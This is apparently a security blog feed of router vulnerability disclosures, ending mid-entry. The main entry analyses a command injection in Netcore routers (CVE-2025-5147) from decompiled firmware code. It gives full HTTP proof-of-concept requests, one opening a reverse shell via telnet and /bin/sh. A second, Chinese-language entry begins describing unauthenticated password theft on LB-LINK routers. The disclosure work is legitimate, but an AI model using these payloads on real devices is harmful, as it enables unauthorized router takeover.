    <entry>
      <title>CVE-2025-5147</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5147/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5147/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-Including-NBR1005GPE-B6-and-NBR200-After-Authorization"><a href="#Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-Including-NBR1005GPE-B6-and-NBR200-After-Authorization" class="headerlink" title="Arbitrary Command Injection Vulnerability in Netcore Routers Including NBR1005GPE, B6, and NBR200 After Authorization"></a>Arbitrary Command Injection Vulnerability in Netcore Routers Including NBR1005GPE, B6, and NBR200 After Authorization</h1><h2 id="Affected-Products-and-Firmware-Download-Links"><a href="#Affected-Products-and-Firmware-Download-Links" class="headerlink" title="Affected Products and Firmware Download Links"></a>Affected Products and Firmware Download Links</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><h2 id="II-Vulnerability-Causes"><a href="#II-Vulnerability-Causes" class="headerlink" title="II. Vulnerability Causes"></a>II. Vulnerability Causes</h2><p>The firmware of these routers uses the <code>uhttpd</code> + <code>ubus</code> architecture.</p><p><strong>uhttpd (Web Server)</strong></p><ul><li>Listens on port <code>80</code> (HTTP) and accepts <code>POST /ubus</code> requests.</li><li>Parses the request header to confirm the <code>Content-Type</code> is <code>application/x-www-form-urlencoded</code>, but the actual payload is JSON (non-standard but common).</li><li>Forwards requests to the <code>ubus</code> RPC service (typically via <code>ubus</code> Unix Socket or CGI interface).</li></ul><p>Running the <code>ubus list</code> command shows registered ubus services</p><p><img src="/image/CVE-2025-5147/1746692696110.png" alt="1746692696110"></p><p>The vulnerability is found in  <code>network_tools</code>(file: <code>/usr/bin/network_tools</code>). In its data segment, the callback function for the <code>tools_ping</code> method is <code>sub_401EB8</code></p><p><img src="/image/CVE-2025-5147/1746696917202.png" alt="1746696917202"></p><p>In <code>sub_401EB8</code>, <code>blobmsg_parse</code> parses Blob format data (OpenWrt’s binary JSON format)</p><p>Parameter values are received through the pointer array <code>v22</code> to <code>v26</code>:</p><ul><li><code>v22</code>: Pointer to the <code>blob_attr</code> of the <code>action</code> field</li><li><code>v23</code>: Pointer to the <code>blob_attr</code> of the <code>url</code> field</li><li><code>v24</code>: Pointer to the <code>blob_attr</code> of the <code>count</code> field</li><li><code>v25</code>: Pointer to the <code>blob_attr</code> of the <code>size</code> field</li><li><code>v26</code>: Pointer to the <code>blob_attr</code> of the <code>wanid</code> field</li></ul><p><img src="/image/CVE-2025-5147/1746697358269.png" alt="1746697358269"></p><p>The string value of the <code>action</code> field in <code>v22</code> is passed to <code>v19</code>. If <code>v19</code> matches the string <code>&quot;start&quot;</code>, the code enters the <code>if</code> branch and passes the pointer array <code>v22</code>~&#96;v26<code>to the</code>v27&#96; array:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v27[<span class="number">0</span>] = <span class="string">&quot;start&quot;</span>;         <span class="comment">// action  </span></span><br><span class="line">v27[<span class="number">1</span>] = url_str_ptr;     <span class="comment">// String pointer (e.g., &quot;192.168.50.2&quot;)  </span></span><br><span class="line">v27[<span class="number">2</span>] = count_int;       <span class="comment">// Converted integer (e.g., 5)  </span></span><br><span class="line">v27[<span class="number">3</span>] = size_int;        <span class="comment">// Converted integer (e.g., 64)  </span></span><br><span class="line">v27[<span class="number">4.</span>.] = wanid_related; <span class="comment">// Optional fields parsed via sub_4019A8  </span></span><br></pre></td></tr></table></figure><p>The code then jumps to <code>LABEL_18</code> and calls the <code>tools_ping((int)v27)</code> function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_401EB8</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">unsigned</span> __int8 *a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// $v1</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v11; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v13; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [sp+20h] [-84h]</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [sp+38h] [-6Ch] BYREF</span></span><br><span class="line">  _BYTE *v23; <span class="comment">// [sp+3Ch] [-68h]</span></span><br><span class="line">  _BYTE *v24; <span class="comment">// [sp+40h] [-64h]</span></span><br><span class="line">  _BYTE *v25; <span class="comment">// [sp+44h] [-60h]</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// [sp+48h] [-5Ch]</span></span><br><span class="line">  _DWORD v27[<span class="number">22</span>]; <span class="comment">// [sp+4Ch] [-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="number">0x50u</span>);</span><br><span class="line">  v5 = a5[<span class="number">1</span>];</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v6 = _bswapsi2((v5 &lt;&lt; <span class="number">8</span>) | *a5 | (a5[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (a5[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>));</span><br><span class="line">  blobmsg_parse(&amp;stru_412FC4, <span class="number">5</span>, &amp;v22, a5 + <span class="number">4</span>, (v6 &amp; <span class="number">0xFFFFFF</span>) - <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">    ulog(<span class="number">3</span>, <span class="string">&quot;%s %d data missing.\n&quot;</span>);</span><br><span class="line">    result = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (*v22 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = ((<span class="type">unsigned</span> __int8)v22[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v22[<span class="number">4</span>];</span><br><span class="line">    v19 = &amp;v22[(((<span class="type">unsigned</span> __int16)((v17 &gt;&gt; <span class="number">8</span>) | ((_WORD)v17 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 = v22 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v27[<span class="number">0</span>] = v19;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;start&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v24 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v25;</span><br><span class="line">        <span class="keyword">if</span> ( v25 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*v23 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = ((<span class="type">unsigned</span> __int8)v23[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v23[<span class="number">4</span>];</span><br><span class="line">            v8 = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v23[(((<span class="type">unsigned</span> __int16)(((_WORD)v18 &lt;&lt; <span class="number">8</span>) | (v18 &gt;&gt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>) + <span class="number">4</span>];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = (<span class="type">unsigned</span> <span class="type">int</span>)(v23 + <span class="number">4</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">1</span>] = v8;</span><br><span class="line">          v9 = v24 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (*v24 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = ((<span class="type">unsigned</span> __int8)v24[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v24[<span class="number">4</span>];</span><br><span class="line">            v9 = (_DWORD *)((<span class="type">char</span> *)v9 + (((<span class="type">unsigned</span> __int16)((v10 &gt;&gt; <span class="number">8</span>) | ((_WORD)v10 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">2</span>] = _bswapsi2(*v9);</span><br><span class="line">          v11 = v7 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (*v7 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v12 = ((<span class="type">unsigned</span> __int8)v7[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v7[<span class="number">4</span>];</span><br><span class="line">            v11 = (_DWORD *)((<span class="type">char</span> *)v11 + (((<span class="type">unsigned</span> __int16)((v12 &gt;&gt; <span class="number">8</span>) | ((_WORD)v12 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          v27[<span class="number">3</span>] = _bswapsi2(*v11);</span><br><span class="line">          <span class="keyword">if</span> ( v26 )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = v26 + <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (*v26 &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = ((<span class="type">unsigned</span> __int8)v26[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v26[<span class="number">4</span>];</span><br><span class="line">              v13 = (_DWORD *)((<span class="type">char</span> *)v13 + (((<span class="type">unsigned</span> __int16)((v14 &gt;&gt; <span class="number">8</span>) | ((_WORD)v14 &lt;&lt; <span class="number">8</span>)) + <span class="number">6</span>) &amp; <span class="number">0xFFFFFFFC</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            v15 = _bswapsi2(*v13);</span><br><span class="line">            sub_4019A8(v15, &amp;v27[<span class="number">4</span>], (<span class="type">char</span> *)&amp;v27[<span class="number">8</span>] + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memset</span>(&amp;v27[<span class="number">4</span>], <span class="number">0</span>, <span class="number">17</span>);</span><br><span class="line">            <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;v27[<span class="number">8</span>] + <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;get&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    blob_buf_init(dword_4131A0, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( tools_ping_get(dword_4131A0) &gt;= <span class="number">0</span> )</span><br><span class="line">      result = ubus_send_reply(a1, a3, dword_4131A0[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;end&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ulog(<span class="number">6</span>, <span class="string">&quot;ping end\n&quot;</span>);</span><br><span class="line">LABEL_18:</span><br><span class="line">    result = tools_ping((<span class="type">int</span>)v27);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  ulog(<span class="number">3</span>, <span class="string">&quot;%s %d data missing.\n&quot;</span>);</span><br><span class="line">  result = <span class="number">9</span>;</span><br><span class="line">LABEL_23:</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v27[<span class="number">20</span>] )</span><br><span class="line">    _stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inside <code>tools_ping()</code>, the command is constructed using:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(v4, <span class="number">0x80u</span>, <span class="string">&quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;</span>, ...);  </span><br></pre></td></tr></table></figure><p>This concatenates the <code>url</code>, <code>count</code>, and <code>size</code> values into <code>v4</code>, which is executed via <code>system(v4);</code>. <strong>A command injection vulnerability exists here</strong> because there is no <strong>validation check</strong> for the user-provided <code>url</code> input.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">tools_ping</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">128</span>]; <span class="comment">// [sp+3Ch] [-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+BCh] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(<span class="type">const</span> <span class="type">char</span> **)a1, <span class="string">&quot;start&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ping_end();</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(</span><br><span class="line">        v4,</span><br><span class="line">        <span class="number">0x80u</span>,</span><br><span class="line">        <span class="string">&quot;(ping %s -c %d -s %d -I %s &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">4</span>),</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">        a1 + <span class="number">16</span>,</span><br><span class="line">        <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">33</span>) )</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v4,</span><br><span class="line">          <span class="number">0x80u</span>,</span><br><span class="line">          <span class="string">&quot;(ping %s -c %d -s %d -I %s &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">          v2,</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">          a1 + <span class="number">33</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          v4,</span><br><span class="line">          <span class="number">0x80u</span>,</span><br><span class="line">          <span class="string">&quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;</span>,</span><br><span class="line">          v2,</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>),</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">12</span>),</span><br><span class="line">          <span class="string">&quot;/tmp/ping.txt&quot;</span>,</span><br><span class="line">          <span class="string">&quot;/tmp/.ping_end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ping_end();</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( _stack_chk_guard != v5 )</span><br><span class="line">    _stack_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="III-POC-Explanation"><a href="#III-POC-Explanation" class="headerlink" title="III. POC Explanation"></a>III. POC Explanation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 211</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/diagnosis.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:20,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b80717ca0f9be34ba9ad970dd0d5891c&quot;,&quot;network_tools&quot;,&quot;tools_ping&quot;,&#123;&quot;command&quot;:&quot;ping&quot;,&quot;wanid&quot;:1,&quot;url&quot;:&quot;);mkfifo /tmp/test;(&quot;,&quot;count&quot;:5,&quot;size&quot;:64,&quot;action&quot;:&quot;start&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 211</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/diagnosis.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:20,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b80717ca0f9be34ba9ad970dd0d5891c&quot;,&quot;network_tools&quot;,&quot;tools_ping&quot;,&#123;&quot;command&quot;:&quot;ping&quot;,&quot;wanid&quot;:1,&quot;url&quot;:&quot;);telnet 192.168.50.1 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test;(&quot;,&quot;count&quot;:5,&quot;size&quot;:64,&quot;action&quot;:&quot;start&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><p><code>snprintf(v4, 0x80u, &quot;(ping %s -c %d -s %d &gt; %s; touch %s)&amp;&quot;, ...);</code></p><p>Since <code>snprintf</code> will truncate the string if it exceeds 80 bytes, the reverse shell command needs to be split. As there is no character filtering applied to the <code>url</code>, it can be replaced with any arbitrary command.</p><p>Demonstration of remote shell access:</p><p><img src="/image/CVE-2025-5147/1746698400088.png" alt="1746698400088"></p><h2 id="IV-Recommended-Solution"><a href="#IV-Recommended-Solution" class="headerlink" title="IV. Recommended Solution"></a>IV. Recommended Solution</h2><p>It is recommended to add a character legitimacy check for the URL.</p><p><strong>Discoverer: Exploo0Osion.</strong></p><p><strong>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2025-10286</title>
      <link href="/2025/04/04/2025-04-4-CNVD-2025-10286/"/>
      <url>/2025/04/04/2025-04-4-CNVD-2025-10286/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="多款LB-LINK路由器存在未授权访问漏洞"><a href="#多款LB-LINK路由器存在未授权访问漏洞" class="headerlink" title="多款LB-LINK路由器存在未授权访问漏洞"></a>多款LB-LINK路由器存在未授权访问漏洞</h1><p>漏洞涉及路由器固件有：</p><p>BL-G1200_V2.0(V1.0.20)升级固件</p><p>BL-AX5400P(V1.0.19)升级固件</p><p>BL-AX1800(V1.0.19)升级固件</p><p>BL-AC3600(V1.0.22)升级固件</p><p>BL-AC2600(V1.0.22)升级固件</p><p>BL-X-PRO_V2.0(V1.0.22)升级固件</p><p>固件来源于官方：<a href="https://www.b-link.net.cn/downloads_16.html">下载中心_必联（LB-LINK）官方网站</a></p><h2 id="一、漏洞衍生的危害"><a href="#一、漏洞衍生的危害" class="headerlink" title="一、漏洞衍生的危害"></a>一、漏洞衍生的危害</h2><h3 id="1-未授权信息泄露"><a href="#1-未授权信息泄露" class="headerlink" title="1.未授权信息泄露"></a>1.未授权信息泄露</h3><p>几乎所有的向 <code>lighttpd.cgi</code>发送的调用函数请求都可以未授权访问，包括 <code>setmanpwd</code>（篡改路由器登录界面密码）、<code>getmanpwd</code>（获取路由器当前登录密码）、<code>getrouterinfo</code>（获取路由信息）、<code>set_remote_manage</code>（开启远程web访问）等等。攻击者只需控制请求中 <code>type</code>字段的函数名称和其他字段便可达成攻击，所有POC均会放在 <code>/POC</code>文件夹中。</p><h4 id="篡改路由器登录界面密码"><a href="#篡改路由器登录界面密码" class="headerlink" title="篡改路由器登录界面密码"></a>篡改路由器登录界面密码</h4><p><img src="/image/CNVD-2025-10286/1743735892380.png" alt="1743735892380"></p><h4 id="获取路由器当前登录密码"><a href="#获取路由器当前登录密码" class="headerlink" title="获取路由器当前登录密码"></a>获取路由器当前登录密码</h4><p><img src="/image/CNVD-2025-10286/1743735978950.png" alt="1743735978950"></p><h4 id="获取路由信息"><a href="#获取路由信息" class="headerlink" title="获取路由信息"></a>获取路由信息</h4><p><img src="/image/CNVD-2025-10286/1743750266465.png" alt="1743750266465"></p><h4 id="开启远程web访问"><a 